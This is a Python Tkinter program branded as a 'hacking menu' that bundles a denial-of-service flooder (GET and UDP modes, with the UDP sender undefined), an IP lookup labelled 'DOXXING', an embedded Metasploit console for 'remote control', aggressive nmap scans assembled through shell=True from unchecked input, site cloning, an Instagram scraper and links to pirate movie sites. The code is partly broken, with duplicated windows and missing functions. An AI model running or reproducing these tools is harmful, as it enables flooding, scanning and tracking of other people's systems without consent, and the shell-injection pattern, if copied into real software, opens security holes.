import tkinter as tk
from tkinter import messagebox, Scrollbar
import requests
import threading
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from tkinter.simpledialog import askstring
import subprocess
import psutil
import platform
import uuid
import socket
import whois
import random
from queue import Queue
import webbrowser
from tqdm import tqdm
import traceback
from tkinter import Tk, Label, Button, Entry, messagebox
from moviepy.editor import VideoFileClip
import vlc
import shutil
import random
import urllib.request
from PIL import Image
import nmap
import tkinter as tk
from tkinter import simpledialog
import getmac
import netifaces
import ipaddress
import sys
import pyperclip
import time
import keyboard


# main window
root = tk.Tk()
root.title("420HELLBLAZERS HACKING MENU: V 1.5.1")
root.configure(bg='black')

# canvas
canvas = tk.Canvas(root, width=400, height=400, bg='black')  # Set the canvas background to black
canvas.pack()

# list to hold the green number objects on the left and right sides
green_number_objects_left = []
green_number_objects_right = []

texts = ["420HellBlazers", "HAVE", "FUN", ""]

text_index = 0

blinking_text = canvas.create_text(200, 200, text=texts[text_index], fill='red', font=('Helvetica', 30), tags='blinking_text')

# Define a function to make the text blink
def blink_text():
    global text_index
    canvas.itemconfig(blinking_text, text=texts[text_index])
    text_index = (text_index + 1) % len(texts)
    root.after(2000, blink_text)

# Define a function to create a green number and animate it
def create_green_number():
    x_left = random.randint(50, 200)
    x_right = random.randint(200, 350)
    green_number = random.randint(1, 100)
    green_number_obj_left = canvas.create_text(x_left, 0, text=str(green_number), fill='green', tags='green_numbers')
    green_number_obj_right = canvas.create_text(x_right, 0, text=str(green_number), fill='green', tags='green_numbers')
    green_number_objects_left.append(green_number_obj_left)
    green_number_objects_right.append(green_number_obj_right)
    animate_green_numbers()

# Define a function to animate the green numbers
def animate_green_numbers():
    for item_left, item_right in zip(green_number_objects_left, green_number_objects_right):
        canvas.move(item_left, 0, 5)
        canvas.move(item_right, 0, 5)
        if canvas.coords(item_left)[1] > 400:
            canvas.delete(item_left)
            green_number_objects_left.remove(item_left)
        if canvas.coords(item_right)[1] > 400:
            canvas.delete(item_right)
            green_number_objects_right.remove(item_right)
    root.after(100, create_green_number)




def set_black_background(top_level_window):
    top_level_window.configure(bg='black')



def ip_tracker_page():
    def get_ip_info():
        ip = ip_entry.get()
        try:
            response = requests.get(f"https://ipinfo.io/{ip}/json")
            data = response.json()
            result_text.delete(1.0, tk.END)
            for key, value in data.items():
                result_text.insert(tk.END, f"{key}: {value}\n")
                root.update()
                root.after(100)

           

        except Exception as e:
            result_text.delete(1.0, tk.END)
            result_text.insert(tk.END, f"An error occurred: {e}")
            root.update()

    def copy_result():
        root.clipboard_clear()
        root.clipboard_append(result_text.get(1.0, tk.END))

    root = tk.Tk()
    root.title("IP Tracker")

    ip_label = tk.Label(root, text="Input IP here:")
    ip_label.pack()

    ip_entry = tk.Entry(root)
    ip_entry.pack()

    fetch_button = tk.Button(root, text="Fetch", command=get_ip_info)
    fetch_button.pack()

    vpn_detector_button = tk.Button(root, text="VPN Detector", command=open_vpn_detector)
    vpn_detector_button.pack()

    vpn_detector_url = "https://vpnapi.io/vpn-detection"
    vpn_link_label = tk.Label(root, text=f"VPN Detector Link: {vpn_detector_url}")
    vpn_link_label.pack()

    scrollbar = tk.Scrollbar(root)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    result_text = tk.Text(root, yscrollcommand=scrollbar.set)
    result_text.pack()

    scrollbar.config(command=result_text.yview)

    copy_button = tk.Button(root, text="Copy", command=copy_result)
    copy_button.pack()






def roku_tv_page():
    ip = None

    def send_command(command):
        def request():
            nonlocal ip
            try:
                if command in ["VolumeUp", "VolumeDown", "PowerOff"]:
                    response = requests.post(f"http://{ip}:8060/keypress/{command}", timeout=5)
                    response.raise_for_status()
                elif command == "Mute":
                    response = requests.post(f"http://{ip}:8060/keypress/VolumeMute", timeout=5)  # Adjust this line for the correct keypress command for muting
                    response.raise_for_status()
                elif command in ["InputHDMI1", "InputHDMI2", "InputHDMI3"]:
                    response = requests.post(f"http://{ip}:8060/keypress/{command}", timeout=5)
                    response.raise_for_status()
                else:
                    messagebox.showerror("Error", "Invalid command.")
            except requests.exceptions.RequestException as e:
                messagebox.showerror("Error", f"An error occurred: {e}")
        
        threading.Thread(target=request).start()

    def on_ip_submit():
        nonlocal ip
        ip = ip_entry.get().strip()
        volume_up_button.config(state=tk.NORMAL, command=lambda: send_command("VolumeUp"))
        volume_down_button.config(state=tk.NORMAL, command=lambda: send_command("VolumeDown"))
        power_off_button.config(state=tk.NORMAL, command=lambda: send_command("PowerOff"))
        mute_button.config(state=tk.NORMAL, command=lambda: send_command("Mute"))
        hdmi1_button.config(state=tk.NORMAL, command=lambda: send_command("InputHDMI1"))
        hdmi2_button.config(state=tk.NORMAL, command=lambda: send_command("InputHDMI2"))
        hdmi3_button.config(state=tk.NORMAL, command=lambda: send_command("InputHDMI3"))

    page = tk.Toplevel(root)
    page.title("Roku TV")
    set_black_background(page)
    ip_label = tk.Label(page, text="Input TV's IP:")
    ip_label.pack()

    ip_entry = tk.Entry(page)
    ip_entry.pack()

    submit_button = tk.Button(page, text="Submit", command=on_ip_submit)
    submit_button.pack()

    volume_up_button = tk.Button(page, text="Volume Up", state=tk.DISABLED)
    volume_up_button.pack()

    volume_down_button = tk.Button(page, text="Volume Down", state=tk.DISABLED)
    volume_down_button.pack()

    power_off_button = tk.Button(page, text="Turn Off", state=tk.DISABLED)
    power_off_button.pack()

    mute_button = tk.Button(page, text="Mute", state=tk.DISABLED)
    mute_button.pack()

    hdmi1_button = tk.Button(page, text="HDMI1", state=tk.DISABLED)
    hdmi1_button.pack()

    hdmi2_button = tk.Button(page, text="HDMI2", state=tk.DISABLED)
    hdmi2_button.pack()

    hdmi3_button = tk.Button(page, text="HDMI3", state=tk.DISABLED)
    hdmi3_button.pack()




def web_clone_page():
    def clone_website():
        try:
            url = url_entry.get()  # Moved the line here
            response = requests.get(url, stream=True)
            folder_name = 'web_clone'
            if not os.path.exists(folder_name):
                os.makedirs(folder_name)

            with open(os.path.join(folder_name, 'index.html'), 'wb') as file:
                file.write(response.content)
            messagebox.showinfo("Success", "Website cloned successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    page = tk.Toplevel(root)
    page.title("Web Clone")
    set_black_background(page)
    note_label = tk.Label(page, text="NOTE: You will have to copy each url to each page in order to clone the entire site.")
    note_label.pack()

    url_entry = tk.Entry(page)  # Define url_entry here
    url_entry.pack()

    clone_button = tk.Button(page, text="Clone Website", command=clone_website)
    clone_button.pack()


def web_crawler_page():
    def find_links(url, depth, all_links):
        if depth > 0:
            try:
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all(['a', 'link', 'script'])
                for link in links:
                    href = None
                    if link.name == 'a' or link.name == 'link':
                        href = link.get('href')
                    elif link.name == 'script':
                        href = link.get('src')
                    if href:
                        absolute_url = urljoin(url, href)
                        all_links.append(f"Link: {absolute_url}")
                        if href.startswith('/') or absolute_url.startswith(url):
                            find_links(absolute_url, depth - 1, all_links)
            except requests.RequestException as e:
                all_links.append(f"An error occurred: {e}")

    def display_links(links, index):
        if index < len(links):
            result_text.insert(tk.END, links[index] + "\n")
            result_text.see(tk.END)  # Auto-scroll to the end
            root.after(1000, display_links, links, index + 1)  # 1000ms = 1 second delay

    def find_all_links():
        url = url_entry.get()
        all_links = []
        try:
            find_links(url, 2, all_links)  # Limiting depth to 2
            result_text.delete(1.0, tk.END)
            display_links(all_links, 0)
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    page = tk.Toplevel(root)
    page.title("Web crawler - all web links")
    set_black_background(page)
    url_label = tk.Label(page, text="Enter Website URL:")
    url_label.pack()

    url_entry = tk.Entry(page)
    url_entry.pack()

    find_all_links_button = tk.Button(page, text="Find All Links", command=find_all_links)
    find_all_links_button.pack()

    result_text = tk.Text(page)
    result_text.pack(fill=tk.BOTH, expand=True)  # Expand the result_text to fill the available space

    page.geometry("400x800")  # Adjust the window geometry




def network_scanner_page():
    def start_scan():
        selected_option = option_var.get()
        ip_to_scan = ip_entry.get()
        if ip_to_scan:
            try:
                if selected_option == 'Aggressive Nmap Scan':
                    # Perform aggressive scan
                    command = f"nmap -T4 -A {ip_to_scan}"
                else:
                    # Perform normal scan
                    command = f"nmap {ip_to_scan}"
                
                result_text.delete(1.0, tk.END)  # Clear previous results
                result_text.insert(tk.END, f"Scanning {ip_to_scan} using {selected_option}...\n\n")
                result = subprocess.check_output(command, shell=True, text=True)
                result_text.insert(tk.END, result)
            except Exception as e:
                result_text.delete(1.0, tk.END)
                result_text.insert(tk.END, f"An error occurred: {e}")

    page = tk.Toplevel(root)
    page.title("Network Scanner")
    set_black_background(page)

    ip_label = tk.Label(page, text="Input IP:")
    ip_label.pack()

    ip_entry = tk.Entry(page)
    ip_entry.pack()

    options = ['Aggressive Nmap Scan', 'Normal Nmap Scan']
    option_var = tk.StringVar(page)
    option_var.set(options[0])

    option_menu = tk.OptionMenu(page, option_var, *options)
    option_menu.pack()

    start_button = tk.Button(page, text="Start Scan", command=start_scan)
    start_button.pack()

    result_text = tk.Text(page)
    result_text.pack()


def pinger_page():
    def ping_ip():
        ips_to_ping = ip_entry.get()
        ips = ips_to_ping.split(",")
        result_text.delete(1.0, tk.END)  # Clear previous results
        for ip_to_ping in ips:
            if ip_to_ping:
                try:
                    command = ["ping", "-c", "1", ip_to_ping.strip()]
                    result = subprocess.run(command, capture_output=True, text=True, check=True)
                    if "bytes from" in result.stdout:
                        status = f"IP {ip_to_ping.strip()} is up.\n"
                    else:
                        status = f"IP {ip_to_ping.strip()} is down.\n"

                    result_text.insert(tk.END, status)
                    result_text.see(tk.END)  # Auto-scroll to the end
                except subprocess.CalledProcessError as e:
                    status = f"An error occurred: {e}\n"
                    result_text.insert(tk.END, status)
                    result_text.see(tk.END)  # Auto-scroll to the end

    page = tk.Toplevel(root)
    page.title("Pinger")

    ip_label = tk.Label(page, text="Input IP(s) separated by comma:")
    ip_label.pack()

    ip_entry = tk.Entry(page)
    ip_entry.pack()

    ping_button = tk.Button(page, text="Ping IP(s)", command=ping_ip)
    ping_button.pack()

    result_text = tk.Text(page)
    result_text.pack()



def show_computer_details():
    def get_computer_details():
        storage = "\n".join([f"{part.mountpoint} - {psutil.disk_usage(part.mountpoint)}"
                             for part in psutil.disk_partitions()])
        cpu_usage = psutil.cpu_percent(interval=1)
        files_count = sum(len(files) for _, _, files in os.walk("/"))  # Replace "/" with your preferred directory
        ip_address = socket.gethostbyname(socket.gethostname())
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        network_name = platform.node()
        battery = psutil.sensors_battery()
        if battery:
            battery_life = f"{battery.percent}%"
        else:
            battery_life = "Battery information not available"
        temperature = psutil.sensors_temperatures()
        if temperature:
            system_temperature = temperature['coretemp'][0].current
            if system_temperature < 40:
                temperature_status = "Cold"
            elif system_temperature > 60:
                temperature_status = "Hot"
            else:
                temperature_status = "Warm"
        else:
            system_temperature = "Temperature information not available"
            temperature_status = "N/A"
        return storage, cpu_usage, files_count, ip_address, mac_address, network_name, battery_life, system_temperature, temperature_status

    details_window = tk.Toplevel(root)
    details_window.title("Computer Details")

    def update_labels():
        storage, cpu_usage, files_count, ip_address, mac_address, network_name, battery_life, system_temperature, temperature_status = get_computer_details()

        details_label = tk.Label(details_window, text=f"Storage Details:\n{storage}\nCPU Usage: {cpu_usage}%\nNumber of Files: {files_count}\nIP Address: {ip_address}\nMAC Address: {mac_address}\nNetwork Name: {network_name}\nBattery Life: {battery_life}\nSystem Temperature: {system_temperature} °C\nTemperature Status: {temperature_status}", justify='left')
        details_label.pack()

    thread = threading.Thread(target=update_labels)
    thread.start()


def ddos_page():
    attack_type = tk.StringVar()  # Create a StringVar to store the selected attack type

    def find_open_port(ip_address, status_box):
        for port in range(1, 65536):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = s.connect_ex((ip_address, port))
            if result == 0:
                status_box.insert(tk.END, f"Open port found: {port}\n")
                return port
            s.close()
        return None

    def send_get_request(ip, port, status_box, packets_box, i):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            s.send("GET / HTTP/1.1\r\n\r\n".encode())
            packets_box.insert(tk.END, f"Packets sent: {i}\n")
        except (socket.timeout, ConnectionRefusedError):
            status_box.insert(tk.END, "Failed to connect to the target.\n")
        finally:
            s.close()

    def run_ddos_attack(ip, packets, status_box, packets_box):
        selected_attack = attack_type.get()  # Get the selected attack type from the StringVar

        if not selected_attack:
            status_box.insert(tk.END, "Please select the attack type before starting the DDoS attack.\n")
            return

        port = find_open_port(ip, status_box)

        if port:
            if selected_attack == "GET Request":
                status_box.insert(tk.END, f"DDoS attack started with GET request on {ip} on port {port}.\n")
                for i in range(1, packets + 1):
                    send_get_request(ip, port, status_box, packets_box, i)
            elif selected_attack == "UDP":
                status_box.insert(tk.END, f"DDoS attack started with UDP on {ip} on port {port}.\n")
                for i in range(1, packets + 1):
                    send_udp_packet(ip, port, status_box, packets_box, i)
            else:
                status_box.insert(tk.END, "Invalid attack type. Please choose a valid option.\n")
        else:
            status_box.insert(tk.END, f"No open port found for {ip}.\n")

    def ddos_attack_thread():
        ip = ip_input.get()
        packets = int(packets_input.get())
        run_ddos_attack(ip, packets, status_box, packets_box)

    # Create a new window
    root = tk.Tk()
    root.title("DDoS Attack")
    note_label = tk.Label(root, text="This will show nothing while the attack is active, once the attack ends then it'll display the results")
    note_label.pack()

    # IP address input
    ip_label = tk.Label(root, text="IP Address:")
    ip_label.pack()
    ip_input = tk.Entry(root)
    ip_input.pack()

    # Packets input
    packets_label = tk.Label(root, text="Packets to send:")
    packets_label.pack()
    packets_input = tk.Entry(root)
    packets_input.pack()

    # Option menu for selecting the attack type
    attack_type_label = tk.Label(root, text="Select Attack Type:")
    attack_type_label.pack()
    attack_type_menu = tk.OptionMenu(root, attack_type, "UDP", "GET Request")
    attack_type_menu.pack()

    # Button to submit the attack
    submit_button = tk.Button(root, text="Start DDoS Attack", command=ddos_attack_thread, bg='green', fg='white')
    attack_type = tk.StringVar()
    submit_button.pack()

    # Text box to display status
    status_box = tk.Text(root, height=10, width=40)
    status_box.pack()

    # Text box to display packets sent
    packets_box = tk.Text(root, height=10, width=40)
    packets_box.pack()





def enqueue_output(out, queue):
    for line in iter(out.readline, b''):
        queue.put(line)
    out.close()

def msfconsole_page():
    def send_command():
        command = command_entry.get()
        if process.stdin:
            process.stdin.write((command + '\n').encode())
            process.stdin.flush()
        command_entry.delete(0, tk.END)  # Clear the entry box after sending command

    def update_text():
        while True:
            try:
                line = queue.get_nowait().decode()
                msfconsole_text.insert(tk.END, line)
                msfconsole_text.see(tk.END)
            except:
                break
        msfconsole_window.after(100, update_text)

    msfconsole_window = tk.Toplevel(root)
    msfconsole_window.geometry("800x600")  # Set the window size

    msfconsole_text = tk.Text(msfconsole_window, height=40, width=100)  # Adjust the height and width of the Text widget
    msfconsole_text.pack()

    command_frame = tk.Frame(msfconsole_window)
    command_frame.pack(pady=10)

    command_entry = tk.Entry(command_frame, width=70)
    command_entry.pack(side=tk.LEFT)

    send_button = tk.Button(command_frame, text="Send Command", command=send_command)
    send_button.pack(side=tk.LEFT)

    command = "msfconsole"
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)

    queue = Queue()
    thread = threading.Thread(target=enqueue_output, args=(process.stdout, queue))
    thread.daemon = True
    thread.start()

    update_text()



root.geometry("800x600")


def soap2day_movies():
    webbrowser.open('https://soap2day.ph/x45/')
def go_movies():
    webbrowser.open('https://gomovies.sx/home')

def free_movies():
    window = tk.Tk()
    window.geometry("300x200")
    window.title("100% FREE MOVIES")
    label = tk.Label(window, text="These are 100% free streaming services, however they have a lot of ads, so use an ad blocker.")
    label.pack(pady=10)

    button1 = tk.Button(window, text="Go Movies!", command=go_movies)
    button1.pack(pady=20)

    button2 = tk.Button(window, text="Soap2day", command=soap2day_movies)
    button2.pack(pady=20)



    window.mainloop()



def download_insta():
    def download_post():
        post_url = entry.get()
        if "instagram.com" not in post_url:
            messagebox.showerror("Error", "Invalid Instagram link!")
            return

        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
            response = requests.get(post_url, headers=headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            image_tags = soup.find_all('meta', attrs={'property': 'og:image'})
            if image_tags:
                image_url = image_tags[0]['content']
                desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
                saved_name = f"saved{random.randint(1, 10000)}"
                file_path = os.path.join(desktop_path, f"{saved_name}.jpg")
                with open(file_path, 'wb') as f:
                    f.write(requests.get(image_url).content)
                img = Image.open(file_path)
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                    img.save(file_path, format='JPEG')
                messagebox.showinfo("Success", "Post downloaded successfully!")
                webbrowser.open(file_path)  # Open the file with the default application
            else:
                messagebox.showerror("Error", "Failed to find image in the post.")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    # Set up the GUI
    window = tk.Tk()
    window.title("Instagram Downloader")

    label = tk.Label(window, text="Enter the Instagram post URL:")
    label.pack()

    entry = tk.Entry(window, width=40)
    entry.pack()

    download_button = tk.Button(window, text="Download", command=download_post)
    download_button.pack()





def network_scanner():
    # Create the popup window
    window = tk.Tk()
    window.title("Network Scanner")

    # Create and place a label to display the router IP
    label = tk.Label(window, text="")
    label.pack()

    # Create the listbox to display the connected devices or a message
    listbox = tk.Listbox(window)
    listbox.pack()

    # Create and place a button to trigger the scan
    button = tk.Button(window, text="Scan", command=lambda: scan_network(listbox, label))
    button.pack()

    # Start the Tkinter event loop for the popup window
    window.mainloop()

def get_default_gateway():
    # Get the default gateway IP address
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            gateway_ip = s.getsockname()[0]
        except Exception as e:
            print(f"Error retrieving default gateway: {e}")
            gateway_ip = None

    return gateway_ip

def scan_network(listbox, label):
    # Clear the listbox before displaying new results
    listbox.delete(0, tk.END)

    # Get the router's IP address (default gateway)
    router_ip = get_default_gateway()

    # Display the router's IP address
    label.config(text=f"Router IP: {router_ip}")

    try:
        # Create a network object using the router's IP and subnet
        network = ipaddress.ip_network(f"{router_ip}/24", strict=False)

        # Perform a scan on all hosts in the local subnet
        scanner = nmap.PortScanner()
        for ip in network.hosts():
            ip_str = str(ip)
            scanner.scan(ip_str, arguments='-sn')  # Use ARP scan (-sn) to discover devices

            # Add the connected devices to the listbox
            for host in scanner.all_hosts():
                listbox.insert(tk.END, f"Device IP: {host}")

    except Exception as e:
        listbox.insert(tk.END, f"Error: {str(e)}")




def run_nslookup():
    if platform.system() == "Windows":
        command = ["powershell", "-Command", "nslookup myip.opendns.com resolver1.opendns.com"]
    else:
        command = ["nslookup", "myip.opendns.com", "resolver1.opendns.com"]

    subprocess.run(command)





def run_testing_py():
    # Replace 'path/to/testing.py' with the actual path to your testing.py file
    subprocess.run(['python3', 'testing.py'])

def creation_page():
    # Create the main window
    window = tk.Tk()
    window.title("Website Generator")

    # Function to be executed when the button is clicked
    def generate_website():
        # Add the command to run testing.py here
        run_testing_py()
        # Add any additional actions related to generating the website

    # Create and place the "Generate Website - HTML" button
    generate_button = tk.Button(window, text="CHANGE HOSTNAME", command=generate_website)
    generate_button.pack(pady=20)






note_label = tk.Label(root, text="HACKING")
note_label.pack()

ddos_button = tk.Button(root, text="DDOS - UDP/GET", command=ddos_page, bg='red', fg='white')
ddos_button.pack()

ip_tracker_button = tk.Button(root, text="DOXXING - IP Tracker", command=ip_tracker_page, bg='red', fg='white')  
ip_tracker_button.pack()

ddos_button = tk.Button(root, text="REMOTE CONTROL - msfconsole", command=msfconsole_page, bg='red', fg='white')
ddos_button.pack()


roku_tv_button = tk.Button(root, text="REMOTE CONTROL - ROKU TV", command=roku_tv_page, bg='red', fg='white') 
roku_tv_button.pack()


web_crawler_button = tk.Button(root, text="WEB CRAWLER - FIND ALL LINKS", command=web_crawler_page, bg='red', fg='white')  
web_crawler_button.pack()

web_clone_button = tk.Button(root, text="WEB CRAWLER - WEB CLONE", command=web_clone_page, bg='red', fg='white')  
web_clone_button.pack()

note_label = tk.Label(root, text="SCANNERS")
note_label.pack()

network_scanner_button = tk.Button(root, text="FULL NMAP SCANNER", command=network_scanner_page, bg='red', fg='white')
network_scanner_button.pack()

note_label = tk.Label(root, text="OTHERS")
note_label.pack()

pinger_button = tk.Button(root, text="PINGER", command=pinger_page, bg='red', fg='white')
pinger_button.pack()


computer_details_button = tk.Button(root, text="COMPUTER DETAILS", command=show_computer_details, bg='red', fg='white')
computer_details_button.pack()

free_movies_button = tk.Button(root, text="FREE MOVIES", command=free_movies, bg='red', fg='white')
free_movies_button.pack()

insta_button = tk.Button(root, text="Download Instagram videos/pictures", command=download_insta, bg='red', fg='white')
insta_button.pack()

network_button = tk.Button(root, text="NETWORK SCANNER", command=network_scanner, bg='red', fg='white')
network_button.pack()

windows_button = tk.Button(root, text="NO-NAME(testing)", command=creation_page, bg='red', fg='blue')
windows_button.pack()

root.after(0, blink_text)
root.after(100, create_green_number)


root.mainloop()


ddos_page()
download_insta()
